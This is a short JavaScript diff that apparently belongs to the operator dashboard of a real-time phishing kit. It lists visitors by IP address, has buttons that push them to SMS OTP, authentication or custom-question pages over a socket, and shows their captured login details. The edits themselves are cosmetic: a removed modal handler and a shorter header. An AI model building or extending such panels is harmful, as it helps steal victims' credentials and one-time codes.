@@ -69,19 +69,11 @@ function setUserDivEventListeners(userDiv, ipAddress, details) {
   const sendAuthButton = userDiv.querySelector('.send-auth-button');
   const customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
   const sendCustomQuestionButton = document.getElementById('sendCustomQuestionButton');
-  const resultsButtonClose = document.getElementById('resultsButtonClose');
+
   if (resultsButton) {
     resultsButton.addEventListener('click', () => showResultsModal(ipAddress));
   }
-  if(resultsButtonClose){
-    resultsButtonClose.addEventListener('click', function(){
-      // Assuming you have a modal with id 'myModal'
-      let modal = new bootstrap.Modal(document.getElementById('resultsModal'));
-
-      // To hide the modal
-      modal.hide();
-    })
-  }
+  
   if (sendOtpSmsButton) {
     sendOtpSmsButton.addEventListener('click', function () {
       socket.emit('sendOTP', { ip: ipAddress, navig: `sms` })
@@ -125,7 +117,7 @@ function showResultsModal(_ipAddress) {
           console.log(details.getUserDataLogin.username)
           modalBody.innerHTML = `   <div class="card mb-3">
           <div class="card-header bg-primary text-white">
-            <strong>User Information - IP: ${ipAddress}</strong>
+            <strong>IP: ${ipAddress}</strong>
           </div>
           <div class="card-body">
             <h5 class="card-title">Login Details</h5>
